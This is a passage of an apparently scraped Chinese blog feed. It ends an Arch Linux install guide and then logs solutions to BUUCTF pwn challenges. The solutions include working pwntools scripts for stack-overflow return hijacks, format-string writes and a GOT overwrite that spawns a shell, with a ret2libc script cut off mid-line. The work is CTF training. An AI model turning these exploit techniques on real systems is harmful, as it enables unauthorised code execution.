title="pacman服务器"></a>pacman服务器</h2><p>pacman是arch的特色，它结合了简单的二进制包和易于使用的构建系统，pacman的目的是可以轻松管理包，不管是官方库还是用户自己创建的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/pacman.d/mirrorlist</span><br><span class="line">cp /etc/pacman.d/mirrorlist /etc/pacman.d/mirrorlist.backup</span><br><span class="line">pacman -Syy</span><br><span class="line">pacman -S pacman-contrib</span><br><span class="line"></span><br><span class="line">rankmirrors -n 6 /etc/pacman.d/mirrorlist.backup &gt; /etc/pacman.d/mirrorlist #</span><br><span class="line"><span class="meta">#</span><span class="bash"> 报错</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在配置时，本人重启过多次，执行过好几次pacman的操作，但当安装过一次后会出现类似</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="string">&quot;Failed to commit transaction (invalid or corrupted package)&quot;</span> error的错误</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 仅需要执行以下命令即可</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> rm /var/lib/pacman/db.lck</span></span><br></pre></td></tr></table></figure><p>cp /etc/pacman.d/mirrorlist.backup /etc/pacman.d/mirrorlist</p><h2 id="下载linux和必要文件"><a href="#下载linux和必要文件" class="headerlink" title="下载linux和必要文件"></a>下载linux和必要文件</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacstrap -i /mnt base base-devel linux linux-firmware linux-headers vim intel-ucode(amd-ucode CPU是什么就装什么) iwd bash-completion</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="配置并进入系统"><a href="#配置并进入系统" class="headerlink" title="配置并进入系统"></a>配置并进入系统</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">genfstab -U -p /mnt &gt;&gt;/mnt/etc/fstab</span><br><span class="line">arch-chroot /mnt # 进入系统</span><br><span class="line"></span><br><span class="line">ls /usr/share/zoneinfo/Asia/Shanghai</span><br><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime # 时区上海</span><br><span class="line">hwclock --systohc</span><br><span class="line">vim /etc/locale.gen #将/etc/locale.gen中en_US.UTF-8和zh_CN.UTF-8的注释去掉</span><br><span class="line">locale-gen # 生成</span><br><span class="line">echo LANG=en_US.UTF-8 &gt;&gt; /etc/locale.conf</span><br><span class="line">export LANG=en_US.UTF-8</span><br></pre></td></tr></table></figure><h2 id="配置主机和网络"><a href="#配置主机和网络" class="headerlink" title="配置主机和网络"></a>配置主机和网络</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hostname # 空文件，输入主机名 本人用Arch</span><br><span class="line">vim /etc/hosts</span><br><span class="line"><span class="meta">#</span><span class="bash"> 编辑为</span></span><br><span class="line">127.0.0.1localhost</span><br><span class="line">::1localhost</span><br><span class="line">127.0.1.1Arch.localdomainArch</span><br></pre></td></tr></table></figure><h2 id="管理员和用户权限"><a href="#管理员和用户权限" class="headerlink" title="管理员和用户权限"></a>管理员和用户权限</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">passwd # 设置密码 root</span><br><span class="line">useradd -m -g users -G wheel,storage,power -s /bin/bash phantomor # phantomor是我的用户名</span><br><span class="line">passwd phantomor # 设置phantomor用户的密码 123456</span><br><span class="line">EDITOR=vim visudo# 编辑sudoer超级用户文件</span><br><span class="line"><span class="meta">#</span><span class="bash"> 编辑如下 找到Uncomment to allow members of group wheel to execute any <span class="built_in">command</span> 把下面的注释去掉</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在最后添加一句</span></span><br><span class="line">Defaults rootpw</span><br></pre></td></tr></table></figure><p>网络配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ip link</span><br><span class="line">ip address add 192.168.1.100/24 dev ens33</span><br><span class="line">ip route add default via 192.168.1.1 </span><br><span class="line">/etc/resolv.conf 添加dns服务地址比如</span><br><span class="line">nameserver 114.114.114.114</span><br><span class="line">nameserver 8.8.8.8</span><br></pre></td></tr></table></figure><p>/lib/ld-linux.so.2</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn做题记录</title>
      <link href="/2021/09/28/PWN/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/09/28/PWN/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn做题记录"><a href="#pwn做题记录" class="headerlink" title="pwn做题记录"></a>pwn做题记录</h1><p>随便做做看看pwn张什么样。随缘更新</p><p>解题套路：</p><ol><li>检查保护情况</li><li>判断漏洞函数，如gets,scanf等</li><li>计算目标变量的在堆栈中距离ebp的偏移</li><li>分析是否已经载入了可以利用的函数，如system，execve等</li><li>分析是否有字符串/bin/sh</li></ol><h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>直接nc连接，没什么好说的</p><h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p><code>知识点</code></p><ul><li>get函数栈溢出</li></ul><p>gets函数的缓冲区是由用户本身提供，由于用户无法指定一次最多可读入多少字节，导致此函数存在巨大安全隐患。换句话来说，就是gets若没有遇到 \n 结束，则会无限读取，没有上限。</p><p>0x401186是fun函数里有system，s到返回地址有0xF+8=23，但不知道下面的为什么可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29226</span>)</span><br><span class="line">p1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">23</span>+p64(<span class="number">0x40118a</span>)</span><br><span class="line">p.sendline(p1)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">23</span> + p64(<span class="number">0x401186</span> + <span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">23</span> + p64(<span class="number">0x401186</span>) + p64(<span class="number">0x401185</span>) <span class="comment">#多加的这部分任意找ret语句 都可以</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">15</span> + p64(<span class="number">0x401186</span>) </span><br><span class="line"><span class="comment"># 这题怎么回事？？搞不明白</span></span><br></pre></td></tr></table></figure><h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p><code>知识点</code></p><ul><li><p>使用gdb插件gdb-peda计算偏移量</p></li><li><p>get栈溢出</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">gdb warmup_csaw_2016</span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> pattern create 200</span></span><br><span class="line">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#x27;</span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> r</span></span><br><span class="line">Starting program: /mnt/c/Users/11145/Desktop/warmup_csaw_2016</span><br><span class="line">-Warm Up-</span><br><span class="line">WOW:0x40060d</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span></span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0x7ffffffee650</span><br><span class="line">RBX: 0x0</span><br><span class="line">RCX: 0x7fffff78e980 --&gt; 0xfbad2288</span><br><span class="line">RDX: 0x0</span><br><span class="line">RSI: 0x6022a1 (&quot;AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n&quot;)</span><br><span class="line">RDI: 0x7fffff791680 --&gt; 0x0</span><br><span class="line">RBP: 0x4141334141644141 (&#x27;AAdAA3AA&#x27;)</span><br></pre></td></tr></table></figure><p>得到RBP寄存器’AAdAA3AA’，输入命令pattern offset IAAeAA4AAJAAf，得到72，同时0x40+8=72</p><p>cat_flag.txt在system里地址为0x40060D</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29533</span>)</span><br><span class="line">payload = <span class="string">b&#x27;x&#x27;</span> * <span class="number">72</span> + p64(<span class="number">0x40060d</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p><code>知识点</code></p><ul><li>不一样的栈溢出</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    result = <span class="built_in">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br></pre></td></tr></table></figure><p>题目意思是输入v1覆盖v2的地址得到v2=11.28125</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var_30 db <span class="number">44</span> dup(?)</span><br><span class="line"><span class="number">-0000000000000004</span> var_4 dd ?</span><br><span class="line">+<span class="number">0000000000000000</span>  s db <span class="number">8</span> dup(?)</span><br><span class="line">+<span class="number">0000000000000008</span>  r db <span class="number">8</span> dup(?)</span><br><span class="line">v1-v2-rbp/rsp-ret</span><br></pre></td></tr></table></figure><p>0x41348000就是16进制的11.28125</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29191</span>)</span><br><span class="line">payload=<span class="string">&quot;A&quot;</span>*<span class="number">44</span>+p64(<span class="number">0x41348000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()     </span><br></pre></td></tr></table></figure><p><code>补充</code></p><p><code>ucomiss S1,S2</code>比较单精度，<code>ucomisd S1,S2</code>比较双精度</p><h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p><code>知识点</code></p><ul><li>fgets函数栈溢出</li><li>pwntools中ELF函数</li></ul><p>checksec查看，保护开了NX</p><p>虽然只能输入32个字符，64个字符才会溢出，但I会变成you，又找到后门函数0x8048F0D所以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25906</span>)</span><br><span class="line">addr=<span class="number">0x08048f0d</span></span><br><span class="line">payload=<span class="number">20</span>*<span class="string">&#x27;I&#x27;</span>+<span class="string">&#x27;A&#x27;</span>*<span class="number">4</span> +p32(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># sh = process(&#x27;./pwn1_sctf_2016&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25906</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1_sctf_2016&#x27;</span>)</span><br><span class="line">get_flag = elf.symbols[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line"><span class="comment"># log.success(&#x27;get_flag_addr =&gt; &#123;&#125;&#x27;.format(hex(get_flag)))</span></span><br><span class="line">payload = <span class="string">&#x27;I&#x27;</span> * <span class="number">21</span> + <span class="string">&#x27;A&#x27;</span> + p32(get_flag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><p><code>知识点</code></p><ul><li>read函数的栈溢出</li></ul><p>发现函数callsystem里有system函数地址为0x400596，read函数中的buf的范围在[rsp+0h] [rbp-80h]，再加上rbp的8字节 所以需要覆盖0x80+8=136。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29647</span>)</span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">136</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line">p.sendline(p1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p><code>知识点</code></p><ul><li>get函数栈溢出</li></ul><p>在encrypt中有get函数,参数到ret0x58。</p><p>后面异或操作，exp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dd</span>(<span class="params">enc</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(enc[i]) &lt;= <span class="number">96</span> <span class="keyword">or</span> <span class="built_in">ord</span>(enc[i]) &gt; <span class="number">122</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(enc[i]) &lt;= <span class="number">64</span> <span class="keyword">or</span> <span class="built_in">ord</span>(enc[i]) &gt; <span class="number">90</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">ord</span>(enc[i]) &gt; <span class="number">47</span> <span class="keyword">or</span> <span class="built_in">ord</span>(enc[i]) &lt;= <span class="number">57</span>:</span><br><span class="line">                    res += <span class="built_in">chr</span>(<span class="built_in">ord</span>(enc[i]) ^ <span class="number">0xf</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res += <span class="built_in">chr</span>(<span class="built_in">ord</span>(enc[i]) ^ <span class="number">0xe</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += <span class="built_in">chr</span>(<span class="built_in">ord</span>(enc[i]) ^ <span class="number">0xd</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><p><code>知识点</code></p><ul><li>格式化漏洞(Format String)</li></ul><p>格式化字符串漏洞的产生根源主要源于对用户输入未进行过滤，这些输入数据都作为数据传递给某些执行格式化操作的函数，如printf，sprintf，vprintf，vprintf。恶意用户 可以使用”%s”,”%x”来得到堆栈的数据，甚至可以通过”%n”来对任意地址进行读写，导致任意代码读写。</p><p><code>atoi函数：将字符串转化为int整数</code></p><p>反编译结果</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">v1 = <span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">srand</span>(v1);</span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">read</span>(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x63</span>u);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, nptr, <span class="number">0xF</span>u);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">atoi</span>(nptr) == dword_804C044 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该题有两种解法</p><p>1、第一个read利用格式化字符串漏洞修改unk_804c044的值，第二个read输入我们修改的值去满足if判断执行system(‘/bin/sh’)</p><p>2、第一个read利用格式化字符串漏洞修改atoi_got为system_plt，第二次read输入”/bin/sh\x00”，执行system(‘/bin/sh’)</p><p>脚本</p><p>思路1：直接利用格式化字符串改写unk_804C044之中的数据，然后输入数据对比得到shell。</p><p>思路2：利用格式化字符串改写atoi的got地址，将其改为system的地址，配合之后的输入，得*到shell。这种方法具有普遍性，也可以改写后面的函数的地址，拿到shell。</p><p>思路3：bss段的unk_804C044，是随机生成的，而我们猜对了这个参数，就可以执行system(“/bin/sh”),刚好字符串格式化漏洞可以实现改写内存地址的值</p><p>exp1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn5&#x27;</span>)</span><br><span class="line">addr = <span class="number">0x0804C044</span></span><br><span class="line"><span class="comment">#地址，也就相当于可打印字符串，共16byte</span></span><br><span class="line">payload = p32(addr)+p32(addr+<span class="number">1</span>)+p32(addr+<span class="number">2</span>)+p32(addr+<span class="number">3</span>)</span><br><span class="line"><span class="comment">#开始将前面输出的字符个数输入到地址之中，hhn是单字节输入，其偏移为10</span></span><br><span class="line"><span class="comment">#%10$hhn就相当于读取栈偏移为10的地方的数据，当做地址，然后将前面的字符数写入到地址之中</span></span><br><span class="line">payload += <span class="string">&quot;%10$hhn%11$hhn%12$hhn%13$hhn&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>exp3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28318</span>)</span><br><span class="line">unk_804C044 = <span class="number">0x0804C044</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;unk_804C044:<span class="number">0x1111</span>&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your name:&quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;your passwd&quot;</span>,<span class="built_in">str</span>(<span class="number">0x1111</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#exp1</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28318</span>)</span><br><span class="line">target_addr = <span class="number">0x0804c044</span></span><br><span class="line">payload = p32(target_addr) + <span class="string">&#x27;%10$n&#x27;</span> <span class="comment">#target_addr = 4byte 4=0x00000004</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;your name:&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;your passwd:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(<span class="number">0x00000004</span>))<span class="comment">#atoi函数将数字</span></span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#exp2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28318</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">fmtstr_payload()自动生成格式化字符串漏洞相应的payload</span></span><br><span class="line"><span class="string">这里是将atoi_got_addr修改为system_plt_addr,从而执行system()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><p>只要控制a1的大小就可以任意控制读入buf的长度，而a1就是sub_804871F中的v5，所以可以构造合适的Payload来控制v5，再通过sub_80487D0中的read来泄露system与/bin/sh的地址</p><p>先使发送的Payload的首字符为\x00来绕过字符串长度比较，再构造合适的长度来改变v5的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload = b&#x27;\x00&#x27; + b&#x27;a&#x27;*6 +&#x27;\xff&#x27;</span><br></pre></td></tr></table></figure><p>v5的值尽可能的大，方便后面操作</p><p>num+函数plt+main+函数参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29889</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn7&#x27;</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;\xff&#x27;</span>*<span 